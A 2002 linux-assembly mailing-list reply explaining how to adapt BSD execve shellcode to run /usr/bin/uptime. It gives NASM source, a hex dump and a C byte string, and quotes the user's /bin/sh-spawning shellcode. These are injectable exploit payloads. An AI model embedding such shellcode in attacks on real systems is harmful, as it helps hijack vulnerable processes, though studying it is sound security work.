From: Stephan Walter <stephan.walter@gmx.ch>
Subject: Re: shellcode
Date: Wed, 26 Jun 2002 19:08:58 +0200
Sender: linux-assembly-owner@vger.kernel.org
Message-ID: <20020626190858.41e57817.stephan.walter@gmx.ch>
References: <20020624001839.H342@nietzsche>
	<20020625212214.4910d000.stephan.walter@gmx.ch>
	<20020625144651.A430@nietzsche>
	<20020625222825.428828b3.stephan.walter@gmx.ch>
	<20020625161401.B27404@nietzsche>
Mime-Version: 1.0
Content-Transfer-Encoding: 7bit
Return-path: <linux-assembly-owner@vger.kernel.org>
In-Reply-To: <20020625161401.B27404@nietzsche>
List-Id: <linux-assembly.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
To: linux-assembly@vger.kernel.org

Please write to the list. Others may also be interested in this. (Or
they may be able to give better answers than mine)

On Tue, 25 Jun 2002 16:14:01 -0500, xlp <xlp@emtel.net.co> wrote:

> hi, let's say i dont want to run /bin/sh, i want to run
> /usr/bin/uptime, How can i get all that functions in hexadecimal?

like this (no guarantee, I haven't tested this):

--------------- snip ----
BITS 32
    xor eax,eax
    push eax
    push "time"
    push "//up"
    push "/bin"
    push "/usr"    ; you have to push the program name like this
    mov ebx,esp
    push eax
    push ebx
    push eax
    push esp
    push ebx
    mov al,0x3b
    push eax
    int 0x80
--------------- snap ---
use "nasm -f bin -o test.bin test.asm" to compile it.

I compiled it for you:

0000000 31 c0 50 68 74 69 6d 65 68 2f 2f 75 70 68 2f 62
0000020 69 6e 68 2f 75 73 72 89 e3 50 53 50 54 53 b0 3b
0000040 50 cd 80

of course you'll have to remove the offset adresses and insert the
backslashes.

or use this snippet:
if you want to change the program, just change the 4 lines (read bottom
to top). but make shure that every string is exactly 4 bytes long and
add "\x68" between them.

char bsdshell[] =        "\x31\xc0\x50\x68"
                  "time"
                         "\x68"
                  "//up"
                         "\x68"
                  "/bin"
                         "\x68"
                  "/usr"
                         "\x89\xe3\x50\x53\x50\x54\x53"
                         "\xb0\x3b\x50\xcd\x80";


> why 25 bytes long?
> %cat 1.c ; cc 1.c ; ./a.out
> main(){
>         char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
>                   "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
>                   "\xb0\x3b\x50\xcd\x80";
>         printf("%d\n", sizeof(bsdshell));
> }
> 26

that's right, it is 26 bytes long, but the last byte is a zero-byte
("end of string") and isn't used for the code.
